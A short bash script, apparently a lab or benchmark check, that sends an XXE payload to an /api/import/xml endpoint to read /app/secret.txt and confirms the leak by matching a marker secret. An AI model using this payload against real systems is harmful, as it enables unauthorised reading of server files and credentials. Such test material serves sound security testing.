#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
payload='<!DOCTYPE x [<!ENTITY e SYSTEM "file:///app/secret.txt">]><x>&e;</x>'
curl -s -X POST "$TARGET/api/import/xml" -H 'content-type: application/xml' --data-binary "$payload" | grep -q 'FASTAPI-LOCAL-SECRET-9b4d'
